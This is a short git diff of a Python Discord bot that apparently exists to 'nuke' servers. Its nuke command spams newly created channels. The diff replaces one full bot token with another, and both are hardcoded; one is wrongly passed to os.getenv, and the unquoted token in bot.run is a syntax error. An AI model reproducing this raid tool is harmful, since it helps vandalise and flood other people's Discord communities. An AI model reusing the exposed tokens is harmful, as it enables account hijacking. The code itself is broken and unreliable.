@@ -3,7 +3,7 @@ from discord.ext import commands
 import asyncio
 import os
 
-TOKEN = os.getenv("MTM3Njg4NjExOTUwNDkzNzA0Mw.GwxHaF.0WL3lbJ6k5aVhW1bphj0rKALEOOpxxwRCQqils")
+TOKEN = os.getenv("MTM4NzM0MDI1OTM2NDMwNjk0NA.GpxFVg.RxnqFs55sso8LK3Q5eZY8M21I2XCb_Z7BQlvZU")
 
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents)
@@ -54,4 +54,4 @@ async def nuke(ctx):
     await asyncio.gather(*(spam(ch) for ch in new_channels))
     print("✅ nuke完了ログ")
 
-bot.run(MTM3Njg4NjExOTUwNDkzNzA0Mw.GwxHaF.0WL3lbJ6k5aVhW1bphj0rKALEOOpxxwRCQqils)
+bot.run(MTM4NzM0MDI1OTM2NDMwNjk0NA.GpxFVg.RxnqFs55sso8LK3Q5eZY8M21I2XCb_Z7BQlvZU)
